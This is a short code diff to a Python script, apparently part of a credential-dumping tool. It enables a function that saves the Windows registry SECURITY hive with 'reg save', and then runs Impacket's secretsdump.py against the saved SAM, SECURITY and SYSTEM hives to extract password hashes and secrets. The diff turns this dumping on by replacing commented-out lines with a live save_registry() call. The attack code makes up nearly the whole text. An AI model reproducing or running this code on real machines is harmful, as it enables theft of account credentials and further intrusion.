@@ -31,12 +31,7 @@ def save_registry():
 	os.system("reg save hklm\security security")
 
 def run():
-	# save_registry()
-	# output = os.popen('python secretsdump.py -sam sam -security security -system system LOCAL').read()
-	# my_path = os.path.abspath(__file__)
-	# mydir = os.path.dirname(my_path)
-	# start = os.path.join(mydir, "secretsdump.py")
-	# result = subprocess.call([sys.executable, start])
+	save_registry()
 	try:
 		result = subprocess.check_output("secretsdump.py -system system -sam sam -security security LOCAL",stderr=subprocess.STDOUT, shell=True)
 		return result
